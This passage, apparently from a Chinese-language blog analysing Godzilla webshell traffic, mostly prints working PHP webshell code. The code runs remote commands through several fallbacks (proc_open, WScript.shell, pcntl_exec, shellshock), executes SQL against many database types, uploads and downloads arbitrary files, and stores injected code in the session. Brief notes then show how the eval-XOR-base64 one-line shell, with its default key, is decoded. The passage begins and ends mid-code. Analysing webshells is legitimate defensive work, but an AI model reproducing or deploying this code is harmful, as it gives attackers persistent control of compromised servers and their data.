number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> @<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$io</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> @<span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token string double-quoted-string">"/"</span> <span class="token operator">&amp;&amp;</span> @<span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"COM"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$w</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">COM</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'WScript.shell'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$e</span><span class="token operator">=</span><span class="token variable">$w</span><span class="token operator">-&gt;</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$cmdLine</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$so</span><span class="token operator">=</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">StdOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$result</span><span class="token operator">.=</span><span class="token variable">$so</span><span class="token operator">-&gt;</span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$se</span><span class="token operator">=</span><span class="token variable">$e</span><span class="token operator">-&gt;</span><span class="token function">StdErr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$result</span><span class="token operator">.=</span><span class="token variable">$se</span><span class="token operator">-&gt;</span><span class="token function">ReadAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pcntl_fork"</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">function_existsEx</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"pcntl_exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"/bin/bash"</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"/bin/sh"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$commandFile</span><span class="token operator">=</span><span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".log"</span><span class="token punctuation">;</span> <span class="token variable">$resultFile</span><span class="token operator">=</span><span class="token function">sys_get_temp_dir</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/"</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".log"</span><span class="token punctuation">;</span> @<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$commandFile</span><span class="token punctuation">,</span><span class="token variable">$cmdLine</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token function">pcntl_fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token variable">$args</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"-c"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$cmdLine</span></span> &gt; <span class="token interpolation"><span class="token variable">$resultFile</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">pcntl_exec</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// the child will only reach this point on exec failure, // because execution shifts to the pcntl_exec()ed command exit(0); default: break; } if (!file_exists($resultFile)){ sleep(2); } $result=file_get_contents($resultFile); @unlink($commandFile); @unlink($resultFile); }elseif(($result=runshellshock(__FILE__, $cmdLine)!==false)) { }else{ return "none of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec is available"; } $result .= @ob_get_contents(); @ob_end_clean(); return $result; } function execSql(){ $dbType=get("dbType"); $dbHost=get("dbHost"); $dbPort=get("dbPort"); $username=get("dbUsername"); $password=get("dbPassword"); $execType=get("execType"); $execSql=get("execSql"); $charset=get("dbCharset"); $currentDb=get("currentDb"); function mysqli_exec($host,$port,$username,$password,$execType,$currentDb,$sql,$charset){ // 创建连接 $conn = new mysqli($host,$username,$password,"",$port); // Check connection if ($conn-&gt;connect_error) { return $conn-&gt;connect_error; } if (!empty($charset)){ $conn-&gt;set_charset($charset); } if (!empty($currentDb)){ $conn-&gt;select_db($currentDb); } $result = $conn-&gt;query($sql); if ($conn-&gt;error){ return $conn-&gt;error; } if ($execType=="update"){ return "Query OK, ".$conn-&gt;affected_rows." rows affected"; }else{ $data="ok\n"; while ($column = $result-&gt;fetch_field()){ $data.=base64_encode($column-&gt;name)."\t"; } $data.="\n"; if ($result-&gt;num_rows &gt; 0) { while($row = $result-&gt;fetch_assoc()) { foreach ($row as $value){ $data.=base64_encode($value)."\t"; } $data.="\n"; } } return $data; } } function mysql_exec($host, $port, $username, $password, $execType, $currentDb,$sql,$charset) { $con = @mysql_connect($host.":".$port, $username, $password); if (!$con) { return mysql_error(); } else { if (!empty($charset)){ mysql_set_charset($charset,$con); } if (!empty($currentDb)){ if (function_existsEx("mysql_selectdb")){ mysql_selectdb($currentDb,$con); }elseif (function_existsEx("mysql_select_db")){ mysql_select_db($currentDb,$con); } } $result = @mysql_query($sql); if (!$result) { return mysql_error(); } if ($execType == "update") { return "Query OK, ".mysql_affected_rows($con)." rows affected"; } else { $data = "ok\n"; for ($i = 0; $i &lt; mysql_num_fields($result); $i++) { $data.= base64_encode(mysql_field_name($result, $i))."\t"; } $data.= "\n"; $rowNum = mysql_num_rows($result); if ($rowNum &gt; 0) { while ($row = mysql_fetch_row($result)) { foreach($row as $value) { $data.= base64_encode($value)."\t"; } $data.= "\n"; } } } @mysql_close($con); return $data; } } function mysqliEx_exec($host, $port, $username, $password, $execType, $currentDb,$sql,$charset){ $port == "" ? $port = "3306" : $port; $T=@mysqli_connect($host,$username,$password,"",$port); if (!empty($charset)){ @mysqli_set_charset($charset); } if (!empty($currentDb)){ @mysqli_select_db($T,$currentDb); } $q=@mysqli_query($T,$sql); if(is_bool($q)){ return mysqli_error($T); }else{ if (mysqli_num_fields($q)&gt;0){ $i=0; $data = "ok\n"; while($col=@mysqli_fetch_field($q)){ $data.=base64_encode($col-&gt;name)."\t"; $i++; } $data.="\n"; while($rs=@mysqli_fetch_row($q)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c]))."\t"; } $data.="\n"; } return $data; }else{ return "Query OK, ".@mysqli_affected_rows($T)." rows affected"; } } } function pg_execEx($host, $port, $username, $password, $execType,$currentDb, $sql,$charset){ $port == "" ? $port = "5432" : $port; $arr=array( 'host'=&gt;$host, 'port'=&gt;$port, 'user'=&gt;$username, 'password'=&gt;$password ); if (!empty($currentDb)){ $arr["dbname"]=$currentDb; } $cs=''; foreach($arr as $k=&gt;$v) { if(empty($v)){ continue; } $cs .= "$k=$v "; } $T=@pg_connect($cs); if(!$T){ return @pg_last_error(); }else{ if (!empty($charset)){ @pg_set_client_encoding($T,$charset); } $q=@pg_query($T, $sql); if(!$q){ return @pg_last_error(); }else{ $n=@pg_num_fields($q); if($n===NULL){ return @pg_last_error(); }elseif($n===0){ return "Query OK, ".@pg_affected_rows($q)." rows affected"; }else{ $data = "ok\n"; for($i=0;$i&lt;$n;$i++){ $data.=base64_encode(@pg_field_name($q,$i))."\t"; } $data.= "\n"; while($row=@pg_fetch_row($q)){ for($i=0;$i&lt;$n;$i++){ $data.=base64_encode($row[$i]!==NULL?$row[$i]:"NULL")."\t"; } $data.= "\n"; } return $data; } } } } function sqlsrv_exec($host, $port, $username, $password, $execType, $currentDb,$sql){ $dbConfig=array("UID"=&gt; $username,"PWD"=&gt;$password); if (!empty($currentDb)){ $dbConfig["Database"]=$currentDb; } $T=@sqlsrv_connect($host,$dbConfig); $q=@sqlsrv_query($T,$sql,null); if($q!==false){ $i=0; $fm=@sqlsrv_field_metadata($q); if(empty($fm)){ $ar=@sqlsrv_rows_affected($q); return "Query OK, ".$ar." rows affected"; }else{ $data = "ok\n"; foreach($fm as $rs){ $data.=base64_encode($rs['Name'])."\t"; $i++; } $data.= "\n"; while($rs=@sqlsrv_fetch_array($q,SQLSRV_FETCH_NUMERIC)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c]))."\t"; } $data.= "\n"; } return $data; } }else{ $err=""; if(($e = sqlsrv_errors()) != null){ foreach($e as $v){ $err.=($e['message'])."\n"; } } return $err; } } function mssql_exec($host, $port, $username, $password, $execType,$currentDb, $sql){ $T=@mssql_connect($host,$username,$password); if (!empty($currentDb)){ @mssql_select_db($currentDb); } $q=@mssql_query($sql,$T); if(is_bool($q)){ return "Query OK, ".@mssql_rows_affected($T)." rows affected"; }else{ $data = "ok\n"; $i=0; while($rs=@mssql_fetch_field($q)){ $data.=base64_encode($rs-&gt;name)."\t"; $i++; } $data.="\n"; while($rs=@mssql_fetch_row($q)){ for($c=0;$c&lt;$i;$c++){ $data.=base64_encode(trim($rs[$c]))."\t"; } $data.="\n"; } @mssql_free_result($q); @mssql_close($T); return $data; } } function oci_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $chs = $charset ? $charset : "utf8"; $mod = 0; $H = @oci_connect($username, $password, $host, $chs, $mod); if (!$H) { $errObj=@oci_error(); return $errObj["message"]; } else { $q = @oci_parse($H, $sql); if (@oci_execute($q)) { $n = oci_num_fields($q); if ($n == 0) { return "Query OK, ".@oci_num_rows($q)." rows affected"; } else { $data = "ok\n"; for ($i = 1; $i &lt;= $n; $i++) { $data.= base64_encode(oci_field_name($q, $i))."\t"; } $data.= "\n"; while ($row = @oci_fetch_array($q, OCI_ASSOC + OCI_RETURN_NULLS)) { foreach($row as $item) { $data.= base64_encode($item !== null ? base64_encode($item) : ""). "\t"; } $data.= "\n"; } return $data; } } else { $e = @oci_error($q); if ($e) { return "ERROR://{$e['message']} in [{$e['sqltext']}] col:{$e['offset']}"; } else { return "false"; } } } } function ora_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $H = @ora_plogon("{$username}@{$host}", "{$password}"); if (!$H) { return "Login Failed!"; } else { $T = @ora_open($H); @ora_commitoff($H); $q = @ora_parse($T, "{$sql}"); $R = ora_exec($T); if ($R) { $n = ora_numcols($T); $data="ok\n"; for ($i = 0; $i &lt; $n; $i++) { $data.=base64_encode(Ora_ColumnName($T, $i))."\t"; } $data.="\n"; while (ora_fetch($T)) { for ($i = 0; $i &lt; $n; $i++) { $data.=base64_encode(trim(ora_getcolumn($T, $i)))."\t"; } $data.="\n"; } return $data; } else { return "false"; } } } function sqlite_exec($host, $port, $username, $password, $execType, $currentDb, $sql, $charset) { $dbh=new SQLite3($host); if(!$dbh){ return "ERROR://CONNECT ERROR".SQLite3::lastErrorMsg(); }else{ $stmt=$dbh-&gt;prepare($sql); if(!$stmt){ return "ERROR://".$dbh-&gt;lastErrorMsg(); } else { $result=$stmt-&gt;execute(); if(!$result){ return $dbh-&gt;lastErrorMsg(); }else{ $bool=True; $data="ok\n"; while($res=$result-&gt;fetchArray(SQLITE3_ASSOC)){ if($bool){ foreach($res as $key=&gt;$value){ $data.=base64_encode($key)."\t"; } $bool=False; $data.="\n"; } foreach($res as $key=&gt;$value){ $data.=base64_encode($value!==NULL?$value:"NULL")."\t"; } $data.="\n"; } if($bool){ if(!$result-&gt;numColumns()){ return "Query OK, ".$dbh-&gt;changes()." rows affected"; }else{ return "ERROR://Table is empty."; } }else{ return $data; } } } $dbh-&gt;close(); } } function pdoExec($databaseType,$host,$port,$username,$password,$execType,$currentDb,$sql){ $conn=null; if ($databaseType==="oracle"){ $databaseType="orcl"; } if (strpos($host,"=")!==false){ $conn = new PDO($host, $username, $password); }else if (!empty($currentDb)){ $conn = new PDO("{$databaseType}:host=$host;port={$port};dbname={$currentDb}", $username, $password); }else{ $conn = new PDO("{$databaseType}:host=$host;port={$port};", $username, $password); } $conn-&gt;setAttribute(3, 0); if ($execType=="update"){ $affectRows=$conn-&gt;exec($sql); if ($affectRows!==false){ return "Query OK, ".$conn-&gt;exec($sql)." rows affected"; }else{ return "Err-&gt;\n".implode(',',$conn-&gt;errorInfo()); } }else{ $data="ok\n"; $stm=$conn-&gt;prepare($sql); if ($stm-&gt;execute()){ $row=$stm-&gt;fetch(2); $_row="\n"; foreach (array_keys($row) as $key){ $data.=base64_encode($key)."\t"; $_row.=base64_encode($row[$key])."\t"; } $data.=$_row."\n"; while ($row=$stm-&gt;fetch(2)){ foreach (array_keys($row) as $key){ $data.=base64_encode($row[$key])."\t"; } $data.="\n"; } return $data; }else{ return "Err-&gt;\n".implode(',',$stm-&gt;errorInfo()); } } } if ($dbType=="mysql"&amp;&amp;(class_exists("mysqli")||function_existsEx("mysql_connect")||function_existsEx("mysqli_connect"))){ if (class_exists("mysqli")){ return mysqli_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }elseif (function_existsEx("mysql_connect")){ return mysql_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }else if (function_existsEx("mysqli_connect")){ return mysqliEx_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType=="postgresql"&amp;&amp;function_existsEx("pg_connect")){ if (function_existsEx("pg_connect")){ return pg_execEx($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType=="sqlserver"&amp;&amp;(function_existsEx("sqlsrv_connect")||function_existsEx("mssql_connect"))){ if (function_existsEx("sqlsrv_connect")){ return sqlsrv_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); }elseif (function_existsEx("mssql_connect")){ return mssql_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); } }elseif ($dbType=="oracle"&amp;&amp;(function_existsEx("oci_connect")||function_existsEx("ora_plogon"))){ if (function_existsEx("oci_connect")){ return oci_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); }else if (function_existsEx("ora_plogon")){ return oci_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } }elseif ($dbType=="sqlite"&amp;&amp;class_exists("SQLite3")){ return sqlite_exec($dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql,$charset); } if (extension_loaded("pdo")){ return pdoExec($dbType,$dbHost,$dbPort,$username,$password,$execType,$currentDb,$execSql); }else{ return "no extension"; } } function base64Encode($data){ return base64_encode($data); } function test(){ return "ok"; } function get($key){ global $parameters; if (isset($parameters[$key])){ return $parameters[$key]; }else{ return null; } } function getAllParameters(){ global $parameters; return $parameters; } function includeCode(){ $classCode=get("binCode"); $codeName=get("codeName"); $_SES=&amp;getSession(); $_SES[$codeName]=$classCode; return "ok"; } function base64Decode($string){ return base64_decode($string); } function convertFilePermissions($fileAttr){ $mod=0; if (strpos($fileAttr,'R')!==false){ $mod=$mod+0444; } if (strpos($fileAttr,'W')!==false){ $mod=$mod+0222; } if (strpos($fileAttr,'X')!==false){ $mod=$mod+0111; } return $mod; } function g_close(){ @session_start(); $_SES=&amp;getSession(); $_SES=null; if (@session_destroy()){ return "ok"; }else{ return "fail!"; } } function bigFileDownload(){ $mode=get("mode"); $fileName=get("fileName"); $readByteNum=get("readByteNum"); $position=get("position"); if ($mode=="fileSize"){ return @filesize($fileName).""; }elseif ($mode=="read"){ if (function_existsEx("fopen")&amp;&amp;function_existsEx("fread")&amp;&amp;function_existsEx("fseek")){ $handle=fopen($fileName,"rb"); if ($handle!==false){ @fseek($handle,$position); $data=fread($handle,$readByteNum); @fclose($handle); if ($data!==false){ return $data; }else{ return "cannot read file"; } }else{ return "cannot open file"; } }else if (function_existsEx("file_get_contents")){ return file_get_contents($fileName,false,null,$position,$readByteNum); }else{ return "no function"; } }else{ return "no mode"; } } function bigFileUpload(){ $fileName=get("fileName"); $fileContents=get("fileContents"); $position=get("position"); if(function_existsEx("fopen")&amp;&amp;function_existsEx("fwrite")&amp;&amp;function_existsEx("fseek")){ $handle=fopen($fileName,"ab"); if ($handle!==false){ fseek($handle,$position); $len=fwrite($handle,$fileContents); @fclose($handle); if ($len!==false){ return "ok"; }else{ return "cannot write file"; } }else{ return "cannot open file"; } }else if (function_existsEx("file_put_contents")){ if (file_put_contents($fileName,$fileContents,FILE_APPEND)!==false){ return "ok"; }else{ return "writer fail"; } }else{ return "no function"; } } function canCallGzipEncode(){ if (function_existsEx("gzencode")){ return "1"; }else{ return "0"; } } function canCallGzipDecode(){ if (function_existsEx("gzdecode")){ return "1"; }else{ return "0"; } } function bytesToInteger($bytes, $position) { $val = 0; $val = $bytes[$position + 3] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position + 2] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position + 1] &amp; 0xff; $val &lt;&lt;= 8; $val |= $bytes[$position] &amp; 0xff; return $val; } function isGzipStream($bin){ if (strlen($bin)&gt;=2){ $bin=substr($bin,0,2); $strInfo = @unpack("C2chars", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); switch ($typeCode) { case 31139: return true; default: return false; } }else{ return false; } } function getBytes($string) { $bytes = array(); for($i = 0; $i &lt; strlen($string); $i++){ array_push($bytes,ord($string[$i])); } return $bytes; }</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容包含了文件操作、执行命令等诸多模块，方便后续调用。</p><h3 id="PHP-EVEAL-XOR-BASE64"><a href="#PHP-EVEAL-XOR-BASE64" class="headerlink" title="PHP_EVEAL_XOR_BASE64"></a>PHP_EVEAL_XOR_BASE64</h3><p>这个shell脚本并无特别，一句话脚本上传即可。在流上与PHP_XOR_BASE64上的区别很明显，PHP_XOR_BASE64是key=加密，PHP_EVEAL_XOR_BASE64是pass=加密&amp;key=加密，那么我们需要考虑的部分在于pass后面跟了什么内容由流可得：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">pass=eval%28base64_decode%28strrev%28urldecode%28%27url解码：pass=eval<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span>strrev<span class="token punctuation">(</span>urldecode<span class="token punctuation">(</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>即是这段加密信息解密的方法：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将加密url解密后：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">K0QfK0QfgACIgoQD9BCIgACIgACIK0wOpkXZrRCLhRXYkRCKlR2bj5WZ90VZtFmTkF2bslXYwRyWO9USTNVRT9FJgACIgACIgACIgACIK0wepU2csFmZ90TIpIybm5WSzNWazFmQ0V2ZiwSY0FGZkgycvBnc0NHKgYWagACIgACIgAiCNsXZzxWZ9BCIgAiCNsTK2EDLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKpkXZrRCLpEGdhRGJo4WdyBEKlR2bj5WZoUGZvNmbl9FN2U2chJGIvh2YlBCIgACIgACIK0wOpYTMsADLpkXZrRiLzNXYwRCK1QWboIHdzJWdzByboNWZgACIgACIgAiCNsTKkF2bslXYwRCKsFmdllQCK0QfgACIgACIgAiCNsTK5V2akwCZh9Gb5FGckgSZk92YuVWPkF2bslXYwRCIgACIgACIgACIgAiCNsXKlNHbhZWP90TKi8mZul0cjl2chJEdldmIsQWYvxWehBHJoM3bwJHdzhCImlGIgACIgACIgoQD7kSeltGJs0VZtFmTkF2bslXYwRyWO9USTNVRT9FJoUGZvNmbl1DZh9Gb5FGckACIgACIgACIK0wepkSXl1WYORWYvxWehBHJb50TJN1UFN1XkgCdlN3cphCImlGIgACIK0wOpkXZrRCLp01czFGcksFVT9EUfRCKlR2bjVGZfRjNlNXYihSZk92YuVWPhRXYkRCIgACIK0wepkSXzNXYwRyWUN1TQ9FJoQXZzNXaoAiZppQD7cSY0IjM1EzY5EGOiBTZ2M2Mn0TeltGJK0wOnQWYvxWehB3J9UWbh5EZh9Gb5FGckoQD7cSelt2J9M3chBHJK0QfK0wOERCIuJXd0VmcgACIgoQD9BCIgAiCNszYk4VXpRyWERCI9ASXpRyWERCIgACIgACIgoQD70VNxYSMrkGJbtEJg0DIjRCIgACIgACIgoQD7BSKrsSaksTKERCKuVGbyR3c8kGJ7ATPpRCKy9mZgACIgoQD7lySkwCRkgSZk92YuVGIu9Wa0Nmb1ZmCNsTKwgyZulGdy9GclJ3Xy9mcyVGQK0wOpADK0lWbpx2Xl1Wa09FdlNHQK0wOpgCdyFGdz9lbvl2czV2cApQD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再将代码逆序排列：</p><pre class="line-numbers language-none"><code class="language-none">DQpAc2Vzc2lvbl9zdGFydCgpOw0KQHNldF90aW1lX2xpbWl0KDApOw0KQGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIGVuY29kZSgkRCwkSyl7DQogICAgZm9yKCRpPTA7JGk8c3RybGVuKCREKTskaSsrKSB7DQogICAgICAgICRjID0gJEtbJGkrMSYxNV07DQogICAgICAgICREWyRpXSA9ICREWyRpXV4kYzsNCiAgICB9DQogICAgcmV0dXJuICREOw0KfQ0KJHBhc3M9J2tleSc7DQokcGF5bG9hZE5hbWU9J3BheWxvYWQnOw0KJGtleT0nM2M2ZTBiOGE5YzE1MjI0YSc7DQppZiAoaXNzZXQoJF9QT1NUWyRwYXNzXSkpew0KICAgICRkYXRhPWVuY29kZShiYXNlNjRfZGVjb2RlKCRfUE9TVFskcGFzc10pLCRrZXkpOw0KICAgIGlmIChpc3NldCgkX1NFU1NJT05bJHBheWxvYWROYW1lXSkpew0KICAgICAgICAkcGF5bG9hZD1lbmNvZGUoJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV0sJGtleSk7DQogICAgICAgIGlmIChzdHJwb3MoJHBheWxvYWQsImdldEJhc2ljc0luZm8iKT09PWZhbHNlKXsNCiAgICAgICAgICAgICRwYXlsb2FkPWVuY29kZSgkcGF5bG9hZCwka2V5KTsNCiAgICAgICAgfQ0KCQlldmFsKCRwYXlsb2FkKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDAsMTYpOw0KICAgICAgICBlY2hvIGJhc2U2NF9lbmNvZGUoZW5jb2RlKEBydW4oJGRhdGEpLCRrZXkpKTsNCiAgICAgICAgZWNobyBzdWJzdHIobWQ1KCRwYXNzLiRrZXkpLDE2KTsNCiAgICB9ZWxzZXsNCiAgICAgICAgaWYgKHN0cnBvcygkZGF0YSwiZ2V0QmFzaWNzSW5mbyIpIT09ZmFsc2Upew0KICAgICAgICAgICAgJF9TRVNTSU9OWyRwYXlsb2FkTmFtZV09ZW5jb2RlKCRkYXRhLCRrZXkpOw0KICAgICAgICB9DQogICAgfQ0KfQ0K<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再base64解码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">@<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$c</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">;</span><span class="token variable">$payloadName</span><span class="token operator">=</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">;</span><span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token variable">$pass</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token 